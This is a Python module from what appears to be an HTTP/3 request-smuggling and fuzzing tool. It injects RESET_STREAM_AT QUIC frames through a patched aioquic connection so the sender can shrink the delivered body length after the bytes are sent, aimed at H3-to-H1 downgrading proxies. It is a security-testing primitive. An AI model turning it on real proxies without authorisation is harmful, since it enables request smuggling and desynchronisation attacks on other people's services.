# Phage: raw QUIC transport-frame injection for frames aioquic does not implement.
# License: Apache-2.0 License

"""Emit RESET_STREAM_AT (frame type 0x24), the reliable-stream-reset extension
(draft-ietf-quic-reliable-stream-reset). aioquic has no support for it, so every
aioquic-based H3 smuggling tool stops at the H3 frame layer and lets the library
reassemble the stream honestly. This reaches one layer lower.

RESET_STREAM_AT resets a stream but guarantees delivery up to a "reliable size"
offset, and an initiator MAY send several to REDUCE the reliable size. That makes
the delivered body length a value the sender can shrink AFTER the bytes are on the
wire, which no H1/H2 transport allows. At an H3->H1 downgrader this is the
transport-length-vs-Content-Length axis of CVE-2026-33555 with a control the attacker
moves after committing bytes.

Wire format (draft-ietf-quic-reliable-stream-reset-07):
    RESET_STREAM_AT { Type(i)=0x24, Stream ID(i), App Error Code(i), Final Size(i),
                      Reliable Size(i) }
All fields are QUIC variable-length integers.

enable_reliable_reset() monkeypatches ONE QuicConnection instance (no global class
change, no aioquic import at module load): it queues frames and appends them to the
next 1-RTT packet by hooking _write_application, mirroring aioquic's own
_write_reset_stream_frame. The peer must have advertised the reset_stream_at
(0x17f7586d2cb571) transport parameter for the frame to be legal; against a peer that
did not, the frame is a protocol violation, which is itself a fuzzing input (does the
proxy close cleanly, or mis-handle the already-forwarded partial body?)."""

RESET_STREAM_AT_TYPE = 0x24
RESET_STREAM_AT_TP = 0x17F7586D2CB571  # transport parameter id (empty value)


def enable_reliable_reset(quic):
    """Give `quic` a send_reset_stream_at(stream_id, error_code, final_size, reliable_size)
    method that emits a RESET_STREAM_AT frame on the next flush. Idempotent per instance."""
    if getattr(quic, "_reset_at_enabled", False):
        return
    quic._reset_at_enabled = True
    quic._reset_at_pending = []
    orig_write_application = quic._write_application  # bound original

    def _write_application(builder, network_path, now):
        orig_write_application(builder, network_path, now)
        if not quic._reset_at_pending:
            return
        # QuicPacketBuilderStop signals no room; leave the frame queued for the next packet.
        from aioquic.quic.packet_builder import QuicPacketBuilderStop

        while quic._reset_at_pending:
            sid, ec, fs, rs = quic._reset_at_pending[0]
            try:
                buf = builder.start_frame(
                    RESET_STREAM_AT_TYPE, capacity=64, handler=lambda *a: None
                )
            except QuicPacketBuilderStop:
                break
            buf.push_uint_var(sid)
            buf.push_uint_var(ec)
            buf.push_uint_var(fs)
            buf.push_uint_var(rs)
            quic._reset_at_pending.pop(0)

    quic._write_application = _write_application

    def send_reset_stream_at(stream_id, error_code, final_size, reliable_size):
        quic._reset_at_pending.append(
            (int(stream_id), int(error_code), int(final_size), int(reliable_size))
        )

    quic.send_reset_stream_at = send_reset_stream_at


def encode_reset_stream_at(stream_id, error_code, final_size, reliable_size):
    """The exact on-wire frame bytes (type + four varints), for tests and byte checks."""

    def uvarint(n):
        if n < 0x40:
            return bytes([n])
        if n < 0x4000:
            return (n | 0x4000).to_bytes(2, "big")
        if n < 0x40000000:
            return (n | 0x80000000).to_bytes(4, "big")
        return (n | 0xC000000000000000).to_bytes(8, "big")

    return b"".join(
        uvarint(v)
        for v in (
            RESET_STREAM_AT_TYPE,
            stream_id,
            error_code,
            final_size,
            reliable_size,
        )
    )
